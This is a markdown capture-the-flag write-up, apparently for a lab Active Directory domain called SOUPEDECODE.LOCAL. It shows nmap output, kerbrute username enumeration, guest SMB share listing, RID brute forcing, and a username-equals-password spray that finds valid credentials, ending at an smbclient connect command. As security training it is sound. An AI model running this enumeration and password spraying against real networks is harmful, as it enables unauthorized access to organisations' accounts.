---
tags:
  - Active_Directory
---

## Enumeration
We will start with nmap:
```sh
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-10-20 16:18:23Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?      syn-ack ttl 125
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-10-20T16:20:01+00:00; -3h00m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL

```

User enumeration:
```sh
kerbrute userenum -d SOUPEDECODE.LOCAL --dc DC01.SOUPEDECODE.LOCAL /snap/seclists/current/Usernames/xato-net-10-million-usernames-dup.txt -o valid_ad_users

2025/10/20 20:34:44 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/10/20 20:34:48 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2025/10/20 20:35:54 >  [+] VALID USERNAME:       guest@SOUPEDECODE.LOCAL
2025/10/20 20:36:01 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2025/10/20 20:38:19 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2025/10/20 20:38:48 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL

```

Try to list shares using `guest`:
```sh
nxc smb 10.10.180.100 -u 'guest' -p '' -d SOUPEDECODE.LOCAL  --no-bruteforce
SMB         10.10.180.100   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.180.100   445    DC01             [+] SOUPEDECODE.LOCAL\guest:
SMB         10.10.180.100   445    DC01             Share           Permissions     Remark
SMB         10.10.180.100   445    DC01             -----           -----------     ------
SMB         10.10.180.100   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.180.100   445    DC01             backup
SMB         10.10.180.100   445    DC01             C$                              Default share
SMB         10.10.180.100   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.180.100   445    DC01             NETLOGON                        Logon server share
SMB         10.10.180.100   445    DC01             SYSVOL                          Logon server share
SMB         10.10.180.100   445    DC01             Users
```

looking at `IPC$`:
```sh
smbclient.py  'SOUPEDECODE.LOCAL\guest@DC01.SOUPEDECODE.LOCAL' -no-pass
# use IPC$
# ls
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 InitShutdown
-rw-rw-rw-          5  Mon Jan  1 02:05:09 1601 lsass
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 ntsvcs
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 scerpc
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-298-0
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-388-0
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 epmapper
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-23c-0
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 LSM_API_service
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-48-0
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 eventlog
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-2d4-0
-rw-rw-rw-          4  Mon Jan  1 02:05:09 1601 wkssvc
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 atsvc
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-298-1
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-518-0
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 TermSrv_API_service
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 Ctx_WinStation_API_service
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 SessEnvPublicRpc
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-7f0-0
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 RpcProxy\49675
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 e80b00e2f31daea5
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 RpcProxy\593
-rw-rw-rw-          4  Mon Jan  1 02:05:09 1601 srvsvc
-rw-rw-rw-          3  Mon Jan  1 02:05:09 1601 netdfs
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-280-0
-rw-rw-rw-          4  Mon Jan  1 02:05:09 1601 W32TIME_ALT
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-ab0-0
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 dotnet-diagnostic-348
-rw-rw-rw-          1  Mon Jan  1 02:05:09 1601 Winsock2\CatalogChangeListener-af4-0
```

Since you have read on `IPC$` you can do rid brute forceing:
```sh
nxc smb SOUPEDECODE.LOCAL -u 'guest' --rid-brute
grep 'SOUPEDECODE\\' rid_brute.txt | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' > usernames.txt
```

Now you can use this wordlist for `kerberosing` and `ASRepRoasting` and you can try enumrate users that have the same username and password:
```sh
nxc smb soupdecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success

SMB         10.10.255.202   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB         10.10.255.202   445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE
SMB         10.10.255.202   445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE
```

We found we login in SMB using `ybob317` : `ybob317`:
```sh
nxc smb SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' --shares
SMB         10.10.255.202   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.255.202   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB         10.10.255.202   445    DC01             [*] Enumerated shares
SMB         10.10.255.202   445    DC01             Share           Permissions     Remark
SMB         10.10.255.202   445    DC01             -----           -----------     ------
SMB         10.10.255.202   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.255.202   445    DC01             backup
SMB         10.10.255.202   445    DC01             C$                              Default share
SMB         10.10.255.202   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.255.202   445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.255.202   445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.255.202   445    DC01             Users           READ

```

Connect:
```sh
smbclient '\\SOUPEDECODE.LOCAL\users' -U 'ybob317' -t 120
```